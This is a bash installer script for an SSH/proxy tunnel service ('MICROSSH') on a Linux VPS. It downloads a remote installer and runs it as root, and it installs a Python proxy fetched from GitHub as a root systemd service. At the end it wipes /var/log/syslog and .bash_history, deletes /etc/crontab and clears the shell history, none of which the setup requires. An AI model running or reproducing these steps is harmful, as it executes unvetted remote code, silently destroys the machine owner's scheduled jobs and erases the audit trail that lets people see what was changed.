# Illegal selling and redistribution of this script is strictly prohibite
# Please respect author's Property
# Binigay sainyo ng libre, ipamahagi nyo rin ng libre.
#
#

# Install AutoScript
function ssh() {
    rm -f UbuntuVPS* && wget -q 'https://raw.githubusercontent.com/Bonveio/BonvScripts/master/UbuntuVPS-Installer' && chmod +x UbuntuVPS-Installer && ./UbuntuVPS-Installer
    rm -f /etc/banner
    wget -qO /etc/banner https://raw.githubusercontent.com/bannerpy/Files/main/mcbanner
    dos2unix -q /etc/banner
    service ssh restart
    service sshd restart
    service dropbear restart
}
ssh

function service() {
# Getting Proxy Template
wget -q -O /etc/microssh https://raw.githubusercontent.com/bannerpy/Files/main/micro.py
chmod +x /etc/microssh
}
service

function service1() {
# Installing Service
cat << END > /etc/systemd/system/microssh.service 
[Unit]
Description=Micro Ssh
Documentation=https://google.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/bin/python -O /etc/microssh
Restart=on-failure

[Install]
WantedBy=multi-user.target
END
}
service1

function setting() {
sed -i "/DEFAULT_HOST = '127.0.0.1:443'/c\DEFAULT_HOST = '127.0.0.1:550'" /etc/microssh

systemctl daemon-reload
systemctl enable microssh
systemctl restart microssh
}
setting




function remove() {
echo "" > .bash_history 
echo '' > /var/log/syslog
}
remove

sleep 2s
rm /etc/crontab
rm /etc/crontab

sleep 2s

history -c
clear




echo "MICROSSH AUTO SCRIPT "
